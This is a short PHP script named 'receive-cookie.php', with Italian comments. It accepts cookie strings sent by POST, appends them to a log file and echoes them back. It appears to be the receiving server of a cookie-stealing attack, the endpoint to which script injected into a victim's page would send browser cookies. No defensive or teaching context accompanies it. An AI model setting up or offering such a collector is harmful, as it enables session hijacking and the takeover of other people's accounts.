<?php
// receive-cookie.php

// Ottieni i cookie inviati
$cookies = isset($_POST['cookies']) ? $_POST['cookies'] : 'No cookies received';

// Logga i cookie in un file (o esegui altre azioni necessarie)
file_put_contents('cookies_log.txt', $cookies . PHP_EOL, FILE_APPEND);

// Risposta
echo 'Cookies received: ' . htmlspecialchars($cookies);
?>
